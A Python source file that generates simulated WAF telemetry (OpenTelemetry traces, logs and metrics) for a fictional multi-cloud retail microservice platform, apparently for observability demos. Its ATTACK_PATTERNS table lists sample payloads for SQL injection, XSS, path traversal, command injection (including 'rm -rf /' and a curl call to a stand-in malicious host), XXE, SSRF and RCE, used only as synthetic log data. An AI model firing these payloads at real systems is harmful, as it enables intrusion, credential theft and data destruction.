"""
WAF Telemetry Generator
Generates realistic WAF events with OpenTelemetry traces, logs, and metrics
"""

import os
import random
import time
from datetime import datetime
from typing import Dict, Any, Tuple
from faker import Faker

from opentelemetry import trace, metrics
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import BatchSpanProcessor
from opentelemetry.sdk.metrics import MeterProvider
from opentelemetry.sdk.metrics.export import PeriodicExportingMetricReader
from opentelemetry.sdk._logs import LoggerProvider, LoggingHandler
from opentelemetry.sdk._logs.export import BatchLogRecordProcessor
from opentelemetry.exporter.otlp.proto.http.trace_exporter import OTLPSpanExporter
from opentelemetry.exporter.otlp.proto.http.metric_exporter import OTLPMetricExporter
from opentelemetry.exporter.otlp.proto.http._log_exporter import OTLPLogExporter
from opentelemetry.sdk.resources import Resource
from opentelemetry.semconv.resource import ResourceAttributes
from opentelemetry.trace import Status, StatusCode
import logging

fake = Faker()


class WAFTelemetryGenerator:
    """Generates WAF telemetry data following OpenTelemetry standards"""

    # OWASP Top 10 Attack Patterns
    ATTACK_PATTERNS = {
        "sql_injection": {
            "name": "SQL Injection",
            "owasp_id": "A03:2021",
            "severity": "high",
            "payloads": [
                "' OR '1'='1",
                "admin'--",
                "1' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "1' AND 1=1--"
            ],
            "rules": ["SQLi-001", "SQLi-002", "SQLi-003"]
        },
        "xss": {
            "name": "Cross-Site Scripting (XSS)",
            "owasp_id": "A03:2021",
            "severity": "high",
            "payloads": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(document.cookie)",
                "<svg/onload=alert('XSS')>",
                "<iframe src='javascript:alert(1)'>"
            ],
            "rules": ["XSS-001", "XSS-002", "XSS-003"]
        },
        "path_traversal": {
            "name": "Path Traversal",
            "owasp_id": "A01:2021",
            "severity": "high",
            "payloads": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "/../../etc/shadow"
            ],
            "rules": ["PATH-001", "PATH-002"]
        },
        "command_injection": {
            "name": "Command Injection",
            "owasp_id": "A03:2021",
            "severity": "critical",
            "payloads": [
                "; ls -la",
                "| cat /etc/passwd",
                "`whoami`",
                "$(curl malicious.com)",
                "&& rm -rf /"
            ],
            "rules": ["CMD-001", "CMD-002"]
        },
        "xxe": {
            "name": "XML External Entity (XXE)",
            "owasp_id": "A05:2021",
            "severity": "high",
            "payloads": [
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
                "<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>",
            ],
            "rules": ["XXE-001", "XXE-002"]
        },
        "csrf": {
            "name": "Cross-Site Request Forgery (CSRF)",
            "owasp_id": "A01:2021",
            "severity": "medium",
            "payloads": ["<form action='https://bank.com/transfer'>"],
            "rules": ["CSRF-001"]
        },
        "lfi": {
            "name": "Local File Inclusion",
            "owasp_id": "A03:2021",
            "severity": "high",
            "payloads": [
                "php://filter/convert.base64-encode/resource=index",
                "file:///etc/passwd",
                "expect://whoami"
            ],
            "rules": ["LFI-001", "LFI-002"]
        },
        "rce": {
            "name": "Remote Code Execution",
            "owasp_id": "A03:2021",
            "severity": "critical",
            "payloads": [
                "eval(base64_decode('malicious'))",
                "system('rm -rf /')",
                "exec('cat /etc/passwd')"
            ],
            "rules": ["RCE-001", "RCE-002"]
        },
        "ldap_injection": {
            "name": "LDAP Injection",
            "owasp_id": "A03:2021",
            "severity": "medium",
            "payloads": ["*)(uid=*))(|(uid=*", "admin)(&(password=*)"],
            "rules": ["LDAP-001"]
        },
        "ssrf": {
            "name": "Server-Side Request Forgery",
            "owasp_id": "A10:2021",
            "severity": "high",
            "payloads": [
                "http://169.254.169.254/latest/meta-data/",
                "http://localhost:8080/admin",
                "file:///etc/passwd"
            ],
            "rules": ["SSRF-001", "SSRF-002"]
        }
    }

    # Cloud Provider Regions
    CLOUD_REGIONS = {
        "aws": [
            "us-east-1", "us-west-2", "eu-west-1", "ap-southeast-1",
            "ap-northeast-1", "us-east-2", "eu-central-1"
        ],
        "azure": [
            "eastus", "westus2", "westeurope", "southeastasia",
            "japaneast", "centralus", "northeurope"
        ],
        "gcp": [
            "us-central1", "us-east1", "europe-west1", "asia-southeast1",
            "asia-northeast1", "us-west1", "europe-west2"
        ]
    }

    # HTTP Methods and Paths
    HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH"]

    # MSA Backend Services - Global Multi-Cloud Retail Platform
    BACKEND_SERVICES = {
        "user-service": {
            "paths": ["/api/users", "/api/users/{id}", "/api/profile", "/api/auth/login", "/api/auth/logout", "/api/auth/register"],
            "methods": ["GET", "POST", "PUT", "DELETE"],
            "weight": 3,
            "calls": ["auth-service", "notification-service"]  # Dependencies
        },
        "auth-service": {
            "paths": ["/api/auth/verify", "/api/auth/token", "/api/auth/refresh"],
            "methods": ["GET", "POST"],
            "weight": 2,
            "calls": ["cache-service", "audit-service"]
        },
        "product-service": {
            "paths": ["/api/products", "/api/products/{id}", "/api/categories", "/api/search"],
            "methods": ["GET", "POST", "PUT", "DELETE"],
            "weight": 4,
            "calls": ["inventory-service", "pricing-service", "recommendation-service"]
        },
        "order-service": {
            "paths": ["/api/orders", "/api/orders/{id}", "/api/cart", "/api/checkout"],
            "methods": ["GET", "POST", "PUT", "DELETE"],
            "weight": 3,
            "calls": ["payment-service", "inventory-service", "shipping-service", "notification-service"]
        },
        "payment-service": {
            "paths": ["/api/payments", "/api/payments/{id}", "/api/refunds", "/api/transactions"],
            "methods": ["GET", "POST"],
            "weight": 2,
            "calls": ["fraud-detection-service", "accounting-service", "notification-service"]
        },
        "inventory-service": {
            "paths": ["/api/inventory", "/api/stock/{id}", "/api/warehouse/{id}"],
            "methods": ["GET", "PUT", "POST"],
            "weight": 3,
            "calls": ["warehouse-service", "supplier-service"]
        },
        "shipping-service": {
            "paths": ["/api/shipping", "/api/tracking/{id}", "/api/delivery"],
            "methods": ["GET", "POST", "PUT"],
            "weight": 2,
            "calls": ["logistics-service", "notification-service"]
        },
        "notification-service": {
            "paths": ["/api/notifications", "/api/email", "/api/sms", "/api/push"],
            "methods": ["POST"],
            "weight": 2,
            "calls": ["template-service"]
        },
        "recommendation-service": {
            "paths": ["/api/recommendations", "/api/personalized", "/api/trending"],
            "methods": ["GET"],
            "weight": 2,
            "calls": ["analytics-service", "product-service"]
        },
        "pricing-service": {
            "paths": ["/api/pricing", "/api/discounts", "/api/promotions"],
            "methods": ["GET", "POST"],
            "weight": 2,
            "calls": ["analytics-service"]
        },
        "fraud-detection-service": {
            "paths": ["/api/fraud/check", "/api/fraud/score"],
            "methods": ["POST"],
            "weight": 1,
            "calls": ["analytics-service", "ml-service"]
        },
        "analytics-service": {
            "paths": ["/api/analytics", "/api/metrics", "/api/reports"],
            "methods": ["GET", "POST"],
            "weight": 1,
            "calls": []
        },
        "cache-service": {
            "paths": ["/api/cache/{key}"],
            "methods": ["GET", "PUT", "DELETE"],
            "weight": 1,
            "calls": []
        },
        "warehouse-service": {
            "paths": ["/api/warehouses", "/api/warehouses/{id}"],
            "methods": ["GET", "PUT"],
            "weight": 1,
            "calls": []
        },
        "supplier-service": {
            "paths": ["/api/suppliers", "/api/suppliers/{id}"],
            "methods": ["GET", "POST"],
            "weight": 1,
            "calls": []
        },
        "logistics-service": {
            "paths": ["/api/logistics", "/api/routes"],
            "methods": ["GET", "POST"],
            "weight": 1,
            "calls": []
        },
        "template-service": {
            "paths": ["/api/templates", "/api/templates/{id}"],
            "methods": ["GET"],
            "weight": 1,
            "calls": []
        },
        "accounting-service": {
            "paths": ["/api/accounting", "/api/ledger"],
            "methods": ["POST"],
            "weight": 1,
            "calls": []
        },
        "audit-service": {
            "paths": ["/api/audit", "/api/logs"],
            "methods": ["POST"],
            "weight": 1,
            "calls": []
        },
        "ml-service": {
            "paths": ["/api/ml/predict", "/api/ml/models"],
            "methods": ["POST"],
            "weight": 1,
            "calls": []
        }
    }

    NORMAL_PATHS = [
        "/api/users", "/api/products", "/api/orders", "/api/search",
        "/api/auth/login", "/api/auth/logout", "/api/profile",
        "/api/dashboard", "/api/settings", "/health"
    ]

    def __init__(self):
        """Initialize the WAF telemetry generator"""
        # Configuration
        self.events_per_second = int(os.getenv('EVENTS_PER_SECOND', 100))
        self.normal_ratio = float(os.getenv('NORMAL_TRAFFIC_RATIO', 0.80))

        # WAF Detection Configuration - False Negative Rates (attacks that pass through)
        self.waf_false_negative_rate = float(os.getenv('WAF_FALSE_NEGATIVE_RATE', 0.02))  # 2% default

        # Detection rates by severity (how often WAF misses attacks)
        self.false_negative_by_severity = {
            "critical": self.waf_false_negative_rate * 0.5,  # 1% miss rate for critical
            "high": self.waf_false_negative_rate,            # 2% miss rate for high
            "medium": self.waf_false_negative_rate * 2.0,    # 4% miss rate for medium
            "low": self.waf_false_negative_rate * 3.0        # 6% miss rate for low
        }

        # Special case: DDoS is harder to block completely
        self.ddos_false_negative_rate = float(os.getenv('DDOS_FALSE_NEGATIVE_RATE', 0.10))  # 10% default

        # Cloud provider ratios (normalize to 1.0)
        aws_ratio = int(os.getenv('AWS_RATIO', 6))
        azure_ratio = int(os.getenv('AZURE_RATIO', 1))
        gcp_ratio = int(os.getenv('GCP_RATIO', 3))
        total = aws_ratio + azure_ratio + gcp_ratio

        self.cloud_weights = {
            "aws": aws_ratio / total,
            "azure": azure_ratio / total,
            "gcp": gcp_ratio / total
        }

        # DDoS simulation - periodic spikes
        self.ddos_cycle_duration = 300  # 5 minutes
        self.ddos_spike_probability = 0.0  # Will be calculated dynamically

        # Initialize OpenTelemetry
        self._init_otel()

        print(f"✅ WAF Generator initialized:")
        print(f"   - Events/sec: {self.events_per_second}")
        print(f"   - Normal traffic: {self.normal_ratio * 100}%")
        print(f"   - WAF False Negative Rate: {self.waf_false_negative_rate * 100}%")
        print(f"   - DDoS False Negative Rate: {self.ddos_false_negative_rate * 100}%")
        print(f"   - Detection by severity:")
        print(f"     • Critical: {(1 - self.false_negative_by_severity['critical']) * 100:.1f}% blocked")
        print(f"     • High: {(1 - self.false_negative_by_severity['high']) * 100:.1f}% blocked")
        print(f"     • Medium: {(1 - self.false_negative_by_severity['medium']) * 100:.1f}% blocked")
        print(f"     • Low: {(1 - self.false_negative_by_severity['low']) * 100:.1f}% blocked")
        print(f"   - Cloud weights: AWS={self.cloud_weights['aws']:.2f}, "
              f"Azure={self.cloud_weights['azure']:.2f}, GCP={self.cloud_weights['gcp']:.2f}")

    def _init_otel(self):
        """Initialize OpenTelemetry with proper configuration"""
        # Store OTLP endpoint for creating providers per cloud
        self.otlp_endpoint = os.getenv('OTEL_EXPORTER_OTLP_ENDPOINT', 'http://localhost:4318')

        # We'll create separate tracer providers per cloud provider for realistic service map
        self.cloud_providers = {}

        # Initialize tracer, meter, and logger providers for each cloud WAF
        for cloud in ["aws", "azure", "gcp"]:
            self._init_cloud_provider(cloud)

        # Initialize backend microservices
        self.backend_services = {}
        for service_name in self.BACKEND_SERVICES.keys():
            self._init_backend_service(service_name)

        # Default tracer for backwards compatibility
        self.tracer = self.cloud_providers["aws"]["tracer"]

        # Create metrics for each cloud provider
        for cloud in ["aws", "azure", "gcp"]:
            meter = self.cloud_providers[cloud]["meter"]

            self.cloud_providers[cloud]["request_counter"] = meter.create_counter(
                name="waf.requests.total",
                description="Total number of WAF requests",
                unit="1"
            )
            self.cloud_providers[cloud]["blocked_counter"] = meter.create_counter(
                name="waf.requests.blocked",
                description="Total number of blocked requests",
                unit="1"
            )
            self.cloud_providers[cloud]["response_time_histogram"] = meter.create_histogram(
                name="waf.response.time",
                description="WAF response time in milliseconds",
                unit="ms"
            )

    def _init_backend_service(self, service_name: str):
        """Initialize OpenTelemetry provider for backend microservice"""
        # Create resource for this backend service
        resource = Resource(attributes={
            ResourceAttributes.SERVICE_NAME: service_name,
            ResourceAttributes.SERVICE_VERSION: "1.0.0",
            ResourceAttributes.DEPLOYMENT_ENVIRONMENT: "production",
        })

        # Trace Provider for this service
        trace_provider = TracerProvider(resource=resource)
        span_exporter = OTLPSpanExporter(endpoint=f"{self.otlp_endpoint}/v1/traces")
        trace_provider.add_span_processor(BatchSpanProcessor(span_exporter))

        # Meter Provider for this service
        metric_reader = PeriodicExportingMetricReader(
            OTLPMetricExporter(endpoint=f"{self.otlp_endpoint}/v1/metrics")
        )
        meter_provider = MeterProvider(resource=resource, metric_readers=[metric_reader])

        # Logger Provider for this service
        logger_provider = LoggerProvider(resource=resource)
        log_exporter = OTLPLogExporter(endpoint=f"{self.otlp_endpoint}/v1/logs")
        logger_provider.add_log_record_processor(BatchLogRecordProcessor(log_exporter))

        # Create logger for this service
        logger = logging.getLogger(f"backend.{service_name}")
        logger.setLevel(logging.INFO)
        handler = LoggingHandler(level=logging.INFO, logger_provider=logger_provider)
        logger.addHandler(handler)

        # Store providers
        self.backend_services[service_name] = {
            "tracer": trace_provider.get_tracer(__name__),
            "meter": meter_provider.get_meter(__name__),
            "logger": logger,
            "trace_provider": trace_provider,
            "meter_provider": meter_provider,
            "logger_provider": logger_provider
        }

    def _init_cloud_provider(self, cloud: str):
        """Initialize OpenTelemetry provider for specific cloud"""
        # Map cloud to service name
        service_names = {
            "aws": "aws-waf",
            "azure": "azure-waf",
            "gcp": "gcp-cloud-armor"
        }

        service_name = service_names[cloud]

        # Create resource for this cloud provider
        resource = Resource(attributes={
            ResourceAttributes.SERVICE_NAME: service_name,
            ResourceAttributes.SERVICE_VERSION: "1.0.0",
            ResourceAttributes.DEPLOYMENT_ENVIRONMENT: "production",
            ResourceAttributes.CLOUD_PROVIDER: cloud,
        })

        # Trace Provider for this cloud
        trace_provider = TracerProvider(resource=resource)
        span_exporter = OTLPSpanExporter(endpoint=f"{self.otlp_endpoint}/v1/traces")
        trace_provider.add_span_processor(BatchSpanProcessor(span_exporter))

        # Meter Provider for this cloud
        metric_reader = PeriodicExportingMetricReader(
            OTLPMetricExporter(endpoint=f"{self.otlp_endpoint}/v1/metrics")
        )
        meter_provider = MeterProvider(resource=resource, metric_readers=[metric_reader])

        # Logger Provider for this cloud
        logger_provider = LoggerProvider(resource=resource)
        log_exporter = OTLPLogExporter(endpoint=f"{self.otlp_endpoint}/v1/logs")
        logger_provider.add_log_record_processor(BatchLogRecordProcessor(log_exporter))

        # Create logger for this cloud
        logger = logging.getLogger(f"waf.{cloud}")
        logger.setLevel(logging.INFO)
        handler = LoggingHandler(level=logging.INFO, logger_provider=logger_provider)
        logger.addHandler(handler)

        # Store providers
        self.cloud_providers[cloud] = {
            "tracer": trace_provider.get_tracer(__name__),
            "meter": meter_provider.get_meter(__name__),
            "logger": logger,
            "trace_provider": trace_provider,
            "meter_provider": meter_provider,
            "logger_provider": logger_provider
        }

    def _calculate_ddos_probability(self) -> float:
        """Calculate DDoS spike probability based on time cycle"""
        # Create periodic spikes: high probability for 30s every 5 minutes
        cycle_position = time.time() % self.ddos_cycle_duration
        spike_start = 60  # Start spike at 1 minute into cycle
        spike_end = 90    # End spike at 1.5 minutes into cycle

        if spike_start <= cycle_position <= spike_end:
            return 0.3  # 30% chance of DDoS during spike window
        return 0.0

    def _select_cloud_provider(self) -> Tuple[str, str]:
        """Select cloud provider based on configured ratios"""
        provider = random.choices(
            list(self.cloud_weights.keys()),
            weights=list(self.cloud_weights.values()),
            k=1
        )[0]
        region = random.choice(self.CLOUD_REGIONS[provider])
        return provider, region

    def _select_backend_service(self) -> Tuple[str, Dict]:
        """Select backend service based on weights"""
        services = list(self.BACKEND_SERVICES.keys())
        weights = [self.BACKEND_SERVICES[s]["weight"] for s in services]

        service_name = random.choices(services, weights=weights, k=1)[0]
        service_config = self.BACKEND_SERVICES[service_name]

        # Select path and method for this service
        path = random.choice(service_config["paths"])
        method = random.choice(service_config["methods"])

        # Replace {id} placeholders with fake IDs
        if "{id}" in path:
            path = path.replace("{id}", str(random.randint(1000, 9999)))

        return service_name, {
            "path": path,
            "method": method,
            "downstream_services": service_config.get("calls", [])
        }

    def _simulate_backend_call(self, service_name: str, path: str, method: str, parent_span_context):
        """Simulate a backend service call with proper trace context"""
        service = self.backend_services[service_name]
        tracer = service["tracer"]
        logger = service["logger"]

        # Create a span for the backend service call (CLIENT span from parent's perspective already created)
        # This is the SERVER span from the backend service's perspective
        with tracer.start_as_current_span(
            f"HTTP {method}",
            kind=trace.SpanKind.SERVER,
            context=parent_span_context
        ) as span:
            # Set span attributes
            span.set_attribute("http.method", method)
            span.set_attribute("http.url", path)
            span.set_attribute("http.target", path)
            span.set_attribute("service.name", service_name)

            # Simulate processing time
            processing_time = random.uniform(5, 50)

            # Log the request
            logger.info(
                f"Processing {method} {path}",
                extra={
                    "http.method": method,
                    "http.url": path,
                    "processing.time_ms": processing_time
                }
            )

            # Get downstream services for this service
            service_config = self.BACKEND_SERVICES[service_name]
            downstream_services = service_config.get("calls", [])

            # Simulate calls to downstream services (30% chance)
            if downstream_services and random.random() < 0.3:
                num_calls = random.randint(1, min(2, len(downstream_services)))
                selected_downstream = random.sample(downstream_services, num_calls)

                for downstream_name in selected_downstream:
                    if downstream_name in self.backend_services:
                        downstream_config = self.BACKEND_SERVICES[downstream_name]
                        downstream_path = random.choice(downstream_config["paths"])
                        downstream_method = random.choice(downstream_config["methods"])

                        if "{id}" in downstream_path:
                            downstream_path = downstream_path.replace("{id}", str(random.randint(1000, 9999)))

                        # Create CLIENT span for downstream call
                        with tracer.start_as_current_span(
                            f"{downstream_name}",
                            kind=trace.SpanKind.CLIENT
                        ) as client_span:
                            client_span.set_attribute("peer.service", downstream_name)
                            client_span.set_attribute("http.method", downstream_method)
                            client_span.set_attribute("http.url", downstream_path)

                            # Recursively call downstream service
                            self._simulate_backend_call(
                                downstream_name,
                                downstream_path,
                                downstream_method,
                                trace.set_span_in_context(client_span)
                            )

            span.set_status(Status(StatusCode.OK))
            return processing_time

    def _generate_normal_request(self) -> Dict[str, Any]:
        """Generate a normal HTTP request"""
        return {
            "method": random.choice(self.HTTP_METHODS),
            "path": random.choice(self.NORMAL_PATHS),
            "query": fake.uri_path() if random.random() > 0.7 else "",
            "user_agent": fake.user_agent(),
            "source_ip": fake.ipv4(),
            "is_attack": False
        }

    def _generate_attack_request(self) -> Dict[str, Any]:
        """Generate an attack request based on OWASP patterns"""
        attack_type = random.choice(list(self.ATTACK_PATTERNS.keys()))
        attack_info = self.ATTACK_PATTERNS[attack_type]

        payload = random.choice(attack_info["payloads"])
        method = "POST" if attack_type in ["sql_injection", "command_injection"] else random.choice(self.HTTP_METHODS)

        # Inject payload into path or query
        if random.random() > 0.5:
            path = f"/api/search?q={payload}"
        else:
            path = f"/api/{payload}"

        return {
            "method": method,
            "path": path,
            "query": f"malicious={payload}",
            "user_agent": fake.user_agent(),
            "source_ip": fake.ipv4(),
            "is_attack": True,
            "attack_type": attack_type,
            "attack_info": attack_info,
            "payload": payload
        }

    def _generate_ddos_request(self) -> Dict[str, Any]:
        """Generate a DDoS request (high volume from same IPs)"""
        # Reuse IP addresses to simulate DDoS
        attacker_ips = [
            "203.0.113.1", "203.0.113.2", "203.0.113.3",
            "198.51.100.1", "198.51.100.2"
        ]

        return {
            "method": "GET",
            "path": random.choice(self.NORMAL_PATHS),
            "query": "",
            "user_agent": "Mozilla/5.0 (Bot)",
            "source_ip": random.choice(attacker_ips),
            "is_attack": True,
            "attack_type": "ddos",
            "attack_info": {
                "name": "DDoS Attack",
                "owasp_id": "N/A",
                "severity": "critical",
                "rules": ["RATE-001"]
            },
            "payload": "high_volume_traffic"
        }

    def _determine_waf_action(self, request: Dict[str, Any]) -> Tuple[str, float, float]:
        """
        Determine WAF action and calculate threat score and response time

        Implements realistic WAF behavior with configurable False Negative rates:
        - Critical attacks: ~99% blocked (1% pass through)
        - High severity: ~98% blocked (2% pass through)
        - Medium severity: ~96% blocked (4% pass through)
        - Low severity: ~94% blocked (6% pass through)
        - DDoS: ~90% blocked (10% pass through)

        Returns:
            (action, threat_score, response_time_ms)
        """
        if request["is_attack"]:
            # Attack detected
            attack_type = request.get("attack_type", "unknown")

            if attack_type == "ddos":
                # DDoS: harder to block completely due to volume
                false_negative_rate = self.ddos_false_negative_rate
                action = "allow" if random.random() < false_negative_rate else "block"
                threat_score = random.uniform(80, 95)
                response_time = random.uniform(5, 15)  # Fast decision
            else:
                # Other attacks: severity-based detection
                severity = request["attack_info"]["severity"]
                false_negative_rate = self.false_negative_by_severity.get(severity, self.waf_false_negative_rate)

                # WAF misses some attacks (False Negative)
                action = "allow" if random.random() < false_negative_rate else "block"

                # Threat score correlates with severity
                if severity == "critical":
                    threat_score = random.uniform(90, 100)
                elif severity == "high":
                    threat_score = random.uniform(75, 90)
                elif severity == "medium":
                    threat_score = random.uniform(60, 75)
                else:  # low
                    threat_score = random.uniform(45, 60)

                response_time = random.uniform(10, 50)  # Slower for complex checks
        else:
            # Normal traffic - should always be allowed
            action = "allow"
            threat_score = random.uniform(0, 20)
            response_time = random.uniform(1, 5)  # Fast for normal traffic

        return action, threat_score, response_time

    def generate_event(self) -> Dict[str, Any]:
        """Generate a single WAF event with full OpenTelemetry instrumentation"""

        # Check for DDoS spike
        self.ddos_spike_probability = self._calculate_ddos_probability()

        # Determine if this is a DDoS attack
        if random.random() < self.ddos_spike_probability:
            request = self._generate_ddos_request()
        # Determine if attack or normal
        elif random.random() > self.normal_ratio:
            request = self._generate_attack_request()
        else:
            request = self._generate_normal_request()

        # Select cloud provider
        cloud_provider, region = self._select_cloud_provider()

        # Determine WAF action
        action, threat_score, response_time_ms = self._determine_waf_action(request)

        # Get the appropriate tracer and logger for this cloud provider
        tracer = self.cloud_providers[cloud_provider]["tracer"]
        logger = self.cloud_providers[cloud_provider]["logger"]

        # Log incoming request (natural logging that OTEL will capture)
        logger.info(
            f"WAF request received",
            extra={
                "cloud.region": region,
                "http.method": request["method"],
                "http.url": request["path"],
                "client.ip": request["source_ip"]
            }
        )

        # Generate trace with span structure: Request → WAF Inspection → Decision
        with tracer.start_as_current_span(
            "waf.request",
            kind=trace.SpanKind.SERVER
        ) as root_span:
            # Root span attributes
            root_span.set_attribute("http.method", request["method"])
            root_span.set_attribute("http.url", request["path"])
            root_span.set_attribute("http.user_agent", request["user_agent"])
            root_span.set_attribute("client.ip", request["source_ip"])
            root_span.set_attribute("cloud.provider", cloud_provider.upper())
            root_span.set_attribute("cloud.region", region)
            root_span.set_attribute("waf.is_attack", request["is_attack"])

            # Child span: WAF Inspection
            with tracer.start_as_current_span(
                "waf.inspection",
                kind=trace.SpanKind.INTERNAL
            ) as inspection_span:
                inspection_span.set_attribute("waf.threat_score", threat_score)

                if request["is_attack"]:
                    attack_info = request["attack_info"]
                    inspection_span.set_attribute("waf.attack_type", request["attack_type"])
                    inspection_span.set_attribute("waf.attack_name", attack_info["name"])
                    inspection_span.set_attribute("waf.owasp_id", attack_info["owasp_id"])
                    inspection_span.set_attribute("waf.severity", attack_info["severity"])
                    inspection_span.set_attribute("waf.payload", request["payload"][:100])  # Truncate
                    matched_rule = random.choice(attack_info["rules"])
                    inspection_span.set_attribute("waf.matched_rule", matched_rule)

                    # Log attack detection (natural logging)
                    logger.warning(
                        f"Threat detected: {attack_info['name']}",
                        extra={
                            "attack.type": request["attack_type"],
                            "attack.name": attack_info["name"],
                            "owasp.id": attack_info["owasp_id"],
                            "severity": attack_info["severity"],
                            "threat.score": threat_score,
                            "matched.rule": matched_rule,
                            "client.ip": request["source_ip"],
                            "payload": request["payload"][:100]
                        }
                    )

                    # Add event for rule match
                    inspection_span.add_event(
                        "waf.rule_matched",
                        attributes={
                            "rule.id": matched_rule,
                            "rule.message": f"Detected {attack_info['name']}",
                            "threat.score": threat_score
                        }
                    )

            # Child span: WAF Decision
            with tracer.start_as_current_span(
                "waf.decision",
                kind=trace.SpanKind.INTERNAL
            ) as decision_span:
                decision_span.set_attribute("waf.action", action)
                decision_span.set_attribute("waf.response_time_ms", response_time_ms)

                # Set span status based on action
                if action == "block":
                    decision_span.set_status(Status(StatusCode.ERROR, "Request blocked by WAF"))
                    root_span.set_status(Status(StatusCode.ERROR, "Request blocked"))

                    # Log blocked request
                    logger.error(
                        f"Request blocked",
                        extra={
                            "waf.action": "block",
                            "threat.score": threat_score,
                            "client.ip": request["source_ip"],
                            "http.method": request["method"],
                            "http.url": request["path"],
                            "response.time_ms": response_time_ms
                        }
                    )
                else:
                    decision_span.set_status(Status(StatusCode.OK))
                    root_span.set_status(Status(StatusCode.OK))

                    # Log allowed request (only for attacks that were allowed to see false negatives)
                    if request["is_attack"]:
                        logger.warning(
                            f"FALSE NEGATIVE: {request['attack_info']['name']} attack passed through WAF",
                            extra={
                                "waf.action": "allow",
                                "waf.false_negative": True,
                                "threat.score": threat_score,
                                "attack.type": request.get("attack_type", "unknown"),
                                "attack.name": request["attack_info"]["name"],
                                "attack.severity": request["attack_info"]["severity"],
                                "attack.owasp_id": request["attack_info"]["owasp_id"],
                                "attack.payload": request.get("payload", "")[:100],
                                "client.ip": request["source_ip"],
                                "http.method": request["method"],
                                "http.url": request["path"]
                            }
                        )

                # Add event for decision
                decision_span.add_event(
                    "waf.decision_made",
                    attributes={
                        "action": action,
                        "reason": "threat_detected" if request["is_attack"] else "clean_traffic"
                    }
                )

            # If request is allowed, route to backend service
            backend_processing_time = 0
            if action == "allow":
                # Select backend service
                service_name, service_info = self._select_backend_service()

                # Create CLIENT span for calling backend service
                with tracer.start_as_current_span(
                    f"{service_name}",
                    kind=trace.SpanKind.CLIENT
                ) as backend_client_span:
                    backend_client_span.set_attribute("peer.service", service_name)
                    backend_client_span.set_attribute("http.method", service_info["method"])
                    backend_client_span.set_attribute("http.url", service_info["path"])

                    # Add security context if this is a False Negative
                    if request["is_attack"]:
                        backend_client_span.set_attribute("security.false_negative", True)
                        backend_client_span.set_attribute("security.attack_type", request["attack_type"])
                        backend_client_span.set_attribute("security.attack_name", request["attack_info"]["name"])
                        backend_client_span.set_attribute("security.threat_score", threat_score)
                        backend_client_span.set_attribute("security.severity", request["attack_info"]["severity"])
                        backend_client_span.set_attribute("security.owasp_id", request["attack_info"]["owasp_id"])

                    # Simulate the backend service call
                    backend_processing_time = self._simulate_backend_call(
                        service_name,
                        service_info["path"],
                        service_info["method"],
                        trace.set_span_in_context(backend_client_span)
                    )

                    log_extra = {
                        "backend.service": service_name,
                        "backend.path": service_info["path"],
                        "backend.method": service_info["method"],
                        "backend.processing_time_ms": backend_processing_time
                    }

                    if request["is_attack"]:
                        log_extra.update({
                            "security.false_negative": True,
                            "security.attack_type": request["attack_type"],
                            "security.threat_score": threat_score
                        })
                        logger.warning(
                            f"Routed FALSE NEGATIVE to {service_name}",
                            extra=log_extra
                        )
                    else:
                        logger.info(
                            f"Routed to {service_name}",
                            extra=log_extra
                        )

        # Record metrics using cloud-specific meters
        cloud_meters = self.cloud_providers[cloud_provider]

        cloud_meters["request_counter"].add(1, {
            "waf.action": action,
            "http.method": request["method"],
            "cloud.region": region
        })

        if action == "block":
            cloud_meters["blocked_counter"].add(1, {
                "attack.type": request.get("attack_type", "none"),
                "cloud.region": region
            })

        cloud_meters["response_time_histogram"].record(response_time_ms, {
            "waf.action": action,
            "cloud.region": region
        })

        # Return event statistics for UI
        return {
            "is_attack": request["is_attack"],
            "action": action,
            "cloud_provider": cloud_provider.upper(),
            "threat_score": threat_score,
            "response_time_ms": response_time_ms
        }
